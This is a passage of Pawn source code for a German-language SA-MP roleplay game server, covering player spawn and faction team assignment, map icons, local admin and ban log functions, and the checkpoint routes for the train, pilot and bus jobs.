			else if(PlayerInfo[playerid][pMember] == 21) { SetSpawnInfo(playerid, 2, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 2; gTeam[playerid] = 2; PlayerInfo[playerid][pModel] = model; }//
			else if(PlayerInfo[playerid][pMember] == 22) { SetSpawnInfo(playerid, 22, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//
			else if(PlayerInfo[playerid][pMember] == 23) { SetSpawnInfo(playerid, 23, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//
			else if(PlayerInfo[playerid][pMember] == 24) { SetSpawnInfo(playerid, 24, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//
			else if(PlayerInfo[playerid][pLeader] == 1) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 2) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 3) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 4) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 5) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 6) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 7) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 8) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 9) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 10) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 11) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 11; gTeam[playerid] = 11; PlayerInfo[playerid][pModel] = model; }
			else if(PlayerInfo[playerid][pLeader] == 12) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Triaden
			else if(PlayerInfo[playerid][pLeader] == 13) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Groove Street
			else if(PlayerInfo[playerid][pLeader] == 14) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Ballas
            else if(PlayerInfo[playerid][pLeader] == 15) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//2fast
            else if(PlayerInfo[playerid][pLeader] == 16) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Los Santos VagosVagos
			else if(PlayerInfo[playerid][pLeader] == 17) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Varios Los Aztecas
			else if(PlayerInfo[playerid][pLeader] == 18) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//Los Santos Rifa
			else if(PlayerInfo[playerid][pLeader] == 19) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }//West Coast Customs
            else if(PlayerInfo[playerid][pLeader] == 20) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }// Terroristen
			else if(PlayerInfo[playerid][pLeader] == 23) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }// Grundwehrdienst
            else if(PlayerInfo[playerid][pLeader] == 24) { SetSpawnInfo(playerid, 11, model,0.0,0.0,0.0,0,0,0,0,0,0,0); PlayerInfo[playerid][pTeam] = 12; gTeam[playerid] = 12; PlayerInfo[playerid][pModel] = model; }// Oamt
			//SetSpawnInfo(playerid, team, model,0.0,0.0,0.0,0,0,0,0,0,0,0);
			SpawnPlayer(playerid);
		}
	}
/*
    for(new i; i<sizeof(Gebiete); i++)//Damit alle gebiete durchlaufen werden
    {
    new color;//Erstellt eine neue Variable
    if(Gebiete[i][gOwner] == 5){color=0x000000B2;}//Hier wird abgefragt welcher Fraktion das Gebiet gehört, damit dann die Farbe dafür gesetzt wird
    if(Gebiete[i][gOwner] == 6){color=0xFFFFFFB2;}
    GangZoneShowForPlayer(playerid, Gebiet[i], color); // Hier wird dann die Zone gezeigt. Als erstes die spielerid, und die ist bei OnPlayerSpawn nunmal mit playerid definiert, dann welches Gebiet also Gebiet^^ und als letztes die Farbe die wir oben definiert haben.
    }
*/
	if(!gPlayerAnimLibsPreloaded[playerid])
	{
   		PreloadAnimLib(playerid,"BOMBER");
   		PreloadAnimLib(playerid,"RAPPING");
    	PreloadAnimLib(playerid,"SHOP");
   		PreloadAnimLib(playerid,"BEACH");
   		PreloadAnimLib(playerid,"SMOKING");
    	PreloadAnimLib(playerid,"FOOD");
    	PreloadAnimLib(playerid,"ON_LOOKERS");
    	PreloadAnimLib(playerid,"DEALER");
		PreloadAnimLib(playerid,"CRACK");
		PreloadAnimLib(playerid,"CARRY");
		PreloadAnimLib(playerid,"COP_AMBIENT");
		PreloadAnimLib(playerid,"PARK");
		PreloadAnimLib(playerid,"INT_HOUSE");
		PreloadAnimLib(playerid,"FOOD");
		gPlayerAnimLibsPreloaded[playerid] = 1;
	}
	if(PlayerInfo[playerid][pChar] > 0)
	{
	SetPlayerSkin(playerid, PlayerInfo[playerid][pChar]);
	}
	else
	{
	SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
	}
	//SetPlayerWeapons(playerid);
	SetPlayerSpawn(playerid);
	SetPlayerToTeamColor(playerid);
//	PlayerFixRadio(playerid);

	if(MapIconsShown[playerid] != 1)
	{

	    MapIconsShown[playerid] = 1;
		mapicons[playerid]++;
		SetPlayerMapIcon(playerid,mapicons[playerid],1544.4790,-1673.6595,13.5585, 30, COLOR_YELLOW);//Pd Sirene
		mapicons[playerid]++;
		SetPlayerMapIcon(playerid,mapicons[playerid],1535.018188,-800.148376,72.849502,36,COLOR_YELLOW);//Autohaus
		mapicons[playerid]++;
		SetPlayerMapIcon(playerid,mapicons[playerid],1481.0009,-1770.3896,18.7958,38,COLOR_YELLOW);//Stadthalle
		mapicons[playerid]++;
        SetPlayerMapIcon(playerid, mapicons[playerid], 1544.4790,-1673.6595,13.5585, 30, COLOR_YELLOW); // LSPD
		mapicons[playerid]++;
		SetPlayerMapIcon(playerid, mapicons[playerid], 1480.9323,-1767.7324,18.7958, 38, COLOR_YELLOW); // Stadthalle



/*
		for(new i = 0; i < sizeof(HouseInfo); i++)
		{
	    	if(HouseInfo[i][hCreated] == 1)
			{
		    	if(HouseInfo[i][hOwned] == 1)
				{
					SetPlayerMapIcon(playerid, i, HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez], 32, COLOR_YELLOW); // Tankstelle LS
				}
		    	else if(HouseInfo[i][hOwned] == 0)
				{
					SetPlayerMapIcon(playerid, i, HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez], 31, COLOR_YELLOW); // Tankstelle LS
				}

			}
		}

*/

		for(new i = 0; i < sizeof(TankeInfo); i++)
		{
	    	if(TankeInfo[i][tCreated] == 1)
			{
				mapicons[playerid]++;
				SetPlayerMapIcon(playerid, mapicons[playerid], TankeInfo[i][tEntranceX], TankeInfo[i][tEntranceY], TankeInfo[i][tEntranceZ], 42, COLOR_YELLOW); // Tankstelle LS

			}
		}

		for(new i = 0; i < sizeof(BizzInfo); i++)
		{

			if(BizzInfo[i][bTyp] == 1)
			{
		    	if(BizzInfo[i][bCreated] == 1)
				{
					mapicons[playerid]++;
					SetPlayerMapIcon(playerid, mapicons[playerid], BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ], 6, COLOR_YELLOW); // Tankstelle LS
				}
			}
			if(BizzInfo[i][bTyp] == 2)
			{
		    	if(BizzInfo[i][bCreated] == 1)
				{
					mapicons[playerid]++;
					SetPlayerMapIcon(playerid, mapicons[playerid], BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ], 14, COLOR_YELLOW); // Tankstelle LS
				}
			}
			if(BizzInfo[i][bTyp] == 3)// Burger Short
			{
		    	if(BizzInfo[i][bCreated] == 1)
				{
					mapicons[playerid]++;
					SetPlayerMapIcon(playerid, mapicons[playerid], BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ], 10, COLOR_YELLOW); // Tankstelle LS
				}
			}
			if(BizzInfo[i][bTyp] == 4)// 24/7
			{
		    	if(BizzInfo[i][bCreated] == 1)
				{
					mapicons[playerid]++;
					SetPlayerMapIcon(playerid, mapicons[playerid], BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ], 38, COLOR_YELLOW); // Tankstelle LS
				}
			}
			if(BizzInfo[i][bTyp] == 5)// 24/7
			{
		    	if(BizzInfo[i][bCreated] == 1)
				{
					mapicons[playerid]++;
					SetPlayerMapIcon(playerid, mapicons[playerid], BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ], 29, COLOR_YELLOW); // Tankstelle LS
				}
			}

			if(BizzInfo[i][bTyp] == 6)// 24/7
			{
		    	if(BizzInfo[i][bCreated] == 1)
				{
					mapicons[playerid]++;
					SetPlayerMapIcon(playerid, mapicons[playerid], BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ], 17, COLOR_YELLOW); // Tankstelle LS
				}
			}

			if(BizzInfo[i][bTyp] == 7)// 24/7
			{
		    	if(BizzInfo[i][bCreated] == 1)
				{
					mapicons[playerid]++;
					SetPlayerMapIcon(playerid, mapicons[playerid], BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ], 49, COLOR_YELLOW); // Tankstelle LS
				}
			}

			if(BizzInfo[i][bTyp] == 8)// 24/7
			{
		    	if(BizzInfo[i][bCreated] == 1)
				{
					mapicons[playerid]++;
					SetPlayerMapIcon(playerid, mapicons[playerid], BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ], 48, COLOR_YELLOW); // Tankstelle LS
				}
			}
		}


//   		SetPlayerMapIcon(playerid, 3, 1944.3260,-1772.9254,13.3906, 42, COLOR_YELLOW); // Tankstelle LS
//   		SetPlayerMapIcon(playerid, 4, -1609.7958,-2718.2048,48.5391, 42, COLOR_YELLOW); // Tankstelle LS
//   		SetPlayerMapIcon(playerid, 5, -2408.7590,976.0934,45.4175, 42, COLOR_YELLOW); // Tankstelle SF
//   		SetPlayerMapIcon(playerid, 6, -1676.6323,414.0262,6.9484, 42, COLOR_YELLOW); // Tankstelle zwischen LS und SF
//   		SetPlayerMapIcon(playerid, 7, 614.9333,1689.7418,6.6968, 42, COLOR_YELLOW); // Tankstelle LV
//   		SetPlayerMapIcon(playerid, 8, -1327.7218,2678.8723,50.0625, 42, COLOR_YELLOW); // Tankstelle LV


		mapicons[playerid]++;
   		SetPlayerMapIcon(playerid, mapicons[playerid], 763.4382,-1357.9314,13.5229, 55, COLOR_YELLOW); // Autohaus LS
		mapicons[playerid]++;
   		SetPlayerMapIcon(playerid, mapicons[playerid], -1660.6235,1213.7648,7.2500, 55, COLOR_YELLOW); // Autohaus SF
		mapicons[playerid]++;
		SetPlayerMapIcon(playerid, mapicons[playerid], 1017.9830,-919.3538,42.3359, 27, COLOR_YELLOW); // FARBE NORTH
		mapicons[playerid]++;
 		SetPlayerMapIcon(playerid, mapicons[playerid], 1911.2693,-1776.6720,13.3828, 27, COLOR_YELLOW); // /FARBE SOUTH
		mapicons[playerid]++;
		SetPlayerMapIcon(playerid, mapicons[playerid], 2002.8409,-2382.0603,13.5469, 27, COLOR_YELLOW); // /FARBE AIRPORT
	}
	if(PlayerInfo[playerid][pGangJailed] == 1)
	{
	    SetPlayerInterior(playerid, 0);
	    SetPlayerVirtualWorld(playerid, 0);
	    SetPlayerPos(playerid, -2816.1074,-1523.2286,140.8438);
	    SendClientMessage(playerid, COLOR_LIGHTRED, " Du befindest dich noch im Gangjail!");
	    return 1;
	}
	return 1;
}

Function CKLog(string[])
{
	new entry[256];
	format(entry, sizeof(entry), "%s\n",string);
	new File:hFile;
	hFile = fopen("ck.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

Function AdminLog(string[])
{
	new entry[256];
	format(entry, sizeof(entry), "%s\n",string);
	new File:hFile;
	hFile = fopen("makeadmin.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

Function PayLog(string[])
{
	new entry[256];
	format(entry, sizeof(entry), "%s\n",string);
	new File:hFile;
	hFile = fopen("pay.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

Function KickLog(string[])
{
	new entry[256];
	format(entry, sizeof(entry), "%s\n",string);
	new File:hFile;
	hFile = fopen("kick.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}
Function Clear(string[])
{
	new entry[256];
	format(entry, sizeof(entry), "%s\n",string);
	new File:hFile;
	hFile = fopen("Clear.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}
Function SKickLog(string[])
{
	new entry[256];
	format(entry, sizeof(entry), "%s\n",string);
	new File:hFile;
	hFile = fopen("skick.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}
Function SperreLog(string[])
{
	new entry[256];
	format(entry, sizeof(entry), "%s\n",string);
	new File:hFile;
	hFile = fopen("Sperre.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}
Function BanLog(string[])
{
	new entry[256];
	format(entry, sizeof(entry), "%s\n",string);
	new File:hFile;
	hFile = fopen("ban.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}
Function MemberLog(string[])
{
	new entry[256];
	format(entry, sizeof(entry), "%s\n",string);
	new File:hFile;
	hFile = fopen("Member.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}
Function LeaderLog(string[])
{
	new entry[256];
	format(entry, sizeof(entry), "%s\n",string);
	new File:hFile;
	hFile = fopen("Leader.log", io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}
Function OnPlayerEnterCheckpoint(playerid)
{

    if(IsPlayerInRangeOfPoint(playerid, 2.5, PrisonCoords[playerid][0], PrisonCoords[playerid][1], PrisonCoords[playerid][2])){
        PlayerInfo[playerid][pPrisonCPs] --;
        if(PlayerInfo[playerid][pPrisonCPs] <= 0){
            SpawnPlayer(playerid);
            SendClientMessage(playerid, COLOR_GREEN, "* Du bist nun wieder aus dem Prison. Benimm dich!");
            DisablePlayerCheckpoint(playerid);
            PlayerInfo[playerid][pPrisonCPs] = 0;
            SetPlayerVirtualWorld(playerid, 0);
            StopAudioStreamForPlayer(playerid);
            return 1;
        }
        SetPlayerPrisonCP(playerid);
    }


    if(PlayerInfo[playerid][pAuftrag] >= 1)
	{
	PlayerInfo[playerid][pAuftrag] = 0;
	PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
	DisablePlayerCheckpoint(playerid);
	}
    new jobcar = GetPlayerVehicleID(playerid);
	 //------------------------------------ ZUG ----------------------------------------------------------//
    if(ZUGCheckpoint[playerid]==1)
    {
    if(GetVehicleModel(jobcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,2864.7500,1264.9058,12.1256,6.0);
	ZUGCheckpoint[playerid]=2;
	TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",20000,0,"i",playerid);
    SendClientMessage(playerid,COLOR_GREEN,"Bitte warten sie kurz...");
    ProxDetector(5.0, playerid, "Nächster Halt: LV-Ost Bahnhof", COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
//	new VID = GetPlayerVehicleID(playerid);
	//Gas[VID]=100;
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinem Fahrzeug.");
	}
	}
	else if(ZUGCheckpoint[playerid]==2)
    {
    if(GetVehicleModel(jobcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,2284.8750,-1268.2974,25.5006,6.0);
	ZUGCheckpoint[playerid]=3;
	TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",20000,0,"i",playerid);
    SendClientMessage(playerid,COLOR_GREEN,"Bitte warten sie kurz...");
    ProxDetector(5.0, playerid, "Nächster Halt: Jefferson Motel", COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinem Fahrzeug.");
	}
	}
	else if(ZUGCheckpoint[playerid]==3)
    {
    if(GetVehicleModel(jobcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,1700.0552,-1953.9387,13.5469,6.0);
	ZUGCheckpoint[playerid]=4;
	TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",20000,0,"i",playerid);
    SendClientMessage(playerid,COLOR_GREEN,"Bitte warten sie kurz...");
    ProxDetector(5.0, playerid, "Nächster Halt: LS-Mitte Bahnhof", COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinem Fahrzeug.");
	}
	}
	else if(ZUGCheckpoint[playerid]==4)
    {
    if(GetVehicleModel(jobcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,794.9127,-1348.1200,-1.5977,6.0);
	ZUGCheckpoint[playerid]=5;
	TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",20000,0,"i",playerid);
    SendClientMessage(playerid,COLOR_GREEN,"Bitte warten sie kurz...");
    ProxDetector(5.0, playerid, "Nächster Halt: LS-Market Station", COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinem Fahrzeug.");
	}
	}
	else if(ZUGCheckpoint[playerid]==5)
    {
    if(GetVehicleModel(jobcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,-698.0576,-1120.7185,54.4394,6.0);
	ZUGCheckpoint[playerid]=6;
	TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",20000,0,"i",playerid);
    SendClientMessage(playerid,COLOR_GREEN,"Bitte warten sie kurz...");
    ProxDetector(5.0, playerid, "Nächster Halt: Zolltunnel", COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinem Fahrzeug.");
	}
	}
	else if(ZUGCheckpoint[playerid]==6)
    {
    if(GetVehicleModel(jobcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,-1942.5582,178.6102,25.7109,6.0);
	ZUGCheckpoint[playerid]=7;
	TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",20000,0,"i",playerid);
    SendClientMessage(playerid,COLOR_GREEN,"Bitte warten sie kurz...");
    ProxDetector(5.0, playerid, "Nächster Halt: SF Hauptbahnhof", COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinem Fahrzeug.");
	}
	}
	else if(ZUGCheckpoint[playerid]==7)
    {
    if(GetVehicleModel(jobcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,-146.5269,1283.4551,20.9643,6.0);
	ZUGCheckpoint[playerid]=8;
	TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",20000,0,"i",playerid);
    SendClientMessage(playerid,COLOR_GREEN,"Bitte warten sie kurz...");
    ProxDetector(5.0, playerid, "Nächster Halt: Fort Carson", COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinem Fahrzeug.");
	}
	}
	else if(ZUGCheckpoint[playerid]==8)
    {
    if(GetVehicleModel(jobcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,741.2421,1958.8184,5.1504,6.0);
	ZUGCheckpoint[playerid]=9;
	TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",20000,0,"i",playerid);
    SendClientMessage(playerid,COLOR_GREEN,"Bitte warten sie kurz...");
    ProxDetector(5.0, playerid, "Nächster Halt: Bone County", COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinem Fahrzeug.");
	}
	}
	else if(ZUGCheckpoint[playerid]==9)
    {
    if(GetVehicleModel(jobcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,1449.2139,2632.2500,12.1256,6.0);
	ZUGCheckpoint[playerid]=10;
	TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",20000,0,"i",playerid);
    SendClientMessage(playerid,COLOR_GREEN,"Bitte warten sie kurz...");
    ProxDetector(5.0, playerid, "Nächster Halt: LV-Nord Hauptbahnhof", COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinem Fahrzeug.");
	}
	}
	else if(ZUGCheckpoint[playerid]==10)
	{
	if(GetVehicleModel(jobcar) == 538 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
    SendClientMessage(playerid,COLOR_GREEN,"Sie haben die Route beendet und erhalten $7500 auf ihr Konto.");
    ProxDetector(5.0, playerid, "Endhaltestelle. Wir bitten alle Fahrgäste auszusteigen.", COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
	DisablePlayerCheckpoint(playerid);
	PlayerInfo[playerid][pAccount]+=7500;
	SetTimerEx("zugpause",600000,false,"i",playerid);
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinem Fahrzeug.");
	}
	}
	// Pilot
	if(FlugCheckpoint[playerid]==1)
    {
    if(GetVehicleModel(jobcar) == 553 || GetVehicleModel(jobcar) == 511 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,-1623.7335,-131.9482,14.1440,6.0);//SF
	SendClientMessage(playerid,COLOR_LIGHTBLUE,"Fliege nun nach SF Dir wurde ein Checkpoint gesetzt.");
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    FlugCheckpoint[playerid]=2;
	}
	else
	{
	SendClientMessage(playerid,COLOR_RED,"Du bist in keinen Flugzeug.");
	}
	}
	if(FlugCheckpoint[playerid]==2)
    {
    if(GetVehicleModel(jobcar) == 553 || GetVehicleModel(jobcar) == 511 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {// Falsches Car
	SetPlayerCheckpoint(playerid,1388.8539,1641.5869,10.8125,6.0);//LV
	SendClientMessage(playerid,COLOR_LIGHTBLUE,"Fliege nun nach LV Dir wurde ein Checkpoint gesetzt.");
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    FlugCheckpoint[playerid]=3;
	}
	else
	{
	SendClientMessage(playerid,COLOR_RED,"Du bist in keinen Flugzeug.");
	}
	}
	else if(FlugCheckpoint[playerid]==3)
    {
    if(GetVehicleModel(jobcar) == 553 || GetVehicleModel(jobcar) == 511 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
	SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast die runde beendet und 5480 Doller verdient.");
    PlayerInfo[playerid][pAccount]+=5480;
    DisablePlayerCheckpoint(playerid);
	FlugCheckpoint[playerid]=0;
	}
	else
	{
	SendClientMessage(playerid,COLOR_RED,"Du bist in keinen Flugzeug.");
	}
	}

//--------------------------------------------------------------------------------------------------------------------


//-------------------------------------------- Busystem ---------------------------------------------------
    if(L1Checkpoint[playerid]==1)
    {
    if(GetVehicleModel(jobcar) == 431 || GetVehicleModel(jobcar) == 437 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,1484.9479,-1735.1843,13.1099,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Stadthalle", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    L1Checkpoint[playerid]=2;
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinen Bus!");
	}
	}
	else if(L1Checkpoint[playerid]==2)
    {
    if(GetVehicleModel(jobcar) == 431 || GetVehicleModel(jobcar) == 437 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
	SetPlayerCheckpoint(playerid,1824.2628,-1685.2709,13.1099,6.0);
    TogglePlayerControllable(playerid,0);
    SetTimerEx("HaltestelleTimer",6000,0,"i",playerid);
    ProxDetector(5.0, playerid, "Nächster Halt: Alhambra", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
	L1Checkpoint[playerid]=3;
	}
	else
	{
	SendClientMessage(playerid,COLOR_GRAD2,"Du bist in keinen Bus!");
	}
	}
    else if(L1Checkpoint[playerid]==3)
    {
    if(GetVehicleModel(jobcar) == 431 || GetVehicleModel(jobcar) == 437 &&(GetPlayerState(playerid)==PLAYER_STATE_DRIVER))
    {
    SetPlayerCheckpoint(playerid,2244.7275,-1658.5972,15.0143,6.0);
    ProxDetector(5.0, playerid, "Nächster Halt: Binco", COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE,COLOR_LIGHTBLUE);
